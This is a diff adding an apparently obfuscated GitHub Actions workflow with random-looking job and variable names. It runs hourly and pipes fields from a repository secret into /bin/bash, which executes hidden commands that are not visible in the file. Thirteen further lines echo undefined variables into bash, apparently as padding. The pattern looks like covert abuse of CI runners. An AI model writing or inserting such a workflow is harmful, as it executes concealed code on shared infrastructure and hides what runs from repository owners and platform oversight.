@@ -1,0 +1,31 @@
+name: feidali3647
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 * * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: feidali3647
+        env:
+          eq12: ${{ secrets.eq12 }}
+        run: |
+          echo $eq12 | jq -r .w37 | /bin/bash
+          echo $dl50449 | jq -r .cocyx98 | /bin/bash
+          echo $bhta8718 | jq -r .pnke7336 | /bin/bash
+          echo $fq220 | jq -r .bc31 | /bin/bash
+          echo $nmpx31 | jq -r .oys7091 | /bin/bash
+          echo $kalo27 | jq -r .nzou35 | /bin/bash
+          echo $m6915 | jq -r .d7 | /bin/bash
+          echo $lrd03749 | jq -r .l7304 | /bin/bash
+          echo $usndh9 | jq -r .c11790 | /bin/bash
+          echo $ftfyg0094 | jq -r .zw74 | /bin/bash
+          echo $p46293 | jq -r .lx77344 | /bin/bash
+          echo $h0 | jq -r .in1 | /bin/bash
+          echo $adtqe69555 | jq -r .pd4 | /bin/bash
+          echo $vkun3 | jq -r .gxql60 | /bin/bash
+
